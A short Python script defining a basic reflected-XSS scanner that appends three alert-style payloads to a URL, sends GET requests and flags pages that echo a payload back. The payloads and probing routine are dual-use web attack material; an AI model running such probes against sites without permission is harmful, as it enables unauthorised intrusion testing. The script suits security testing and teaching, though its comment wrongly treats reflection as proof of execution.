import requests

def xss_scan(url):
    # List of common XSS payloads
    payloads = [
        "<script>alert('XSS')</script>",
        "'><script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
    ]
    
    for payload in payloads:
        xss_url = f"{url}{payload}"
        print(f"Testing XSS at: {xss_url}")
        
        try:
            response = requests.get(xss_url, timeout=10)
            # Check if the payload appears in the response (indicating it was executed)
            if payload in response.text:
                print(f"[!] Potential XSS vulnerability found at: {url}")
                return True
            else:
                print(f"[+] No XSS vulnerability found at: {url}")
        except requests.exceptions.RequestException as e:
            print(f"Request error: {e}")
    
    return False
